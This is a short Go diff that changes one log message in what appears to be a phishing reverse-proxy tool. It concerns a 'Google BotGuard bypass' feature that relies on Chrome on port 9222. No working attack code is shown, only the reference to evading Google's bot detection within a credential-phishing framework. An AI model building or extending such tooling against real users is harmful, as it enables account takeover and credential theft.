@@ -2590,7 +2590,7 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 func (p *HttpProxy) SetGoogleBypass(enabled bool) {
 	p.googleBypass = enabled
 	if enabled {
-		log.Info("google BotGuard bypass enabled (build with -tags googlebypass; requires Chrome on port 9222)")
+		log.Info("google BotGuard bypass enabled (requires Chrome on port 9222)")
 	}
 }
 
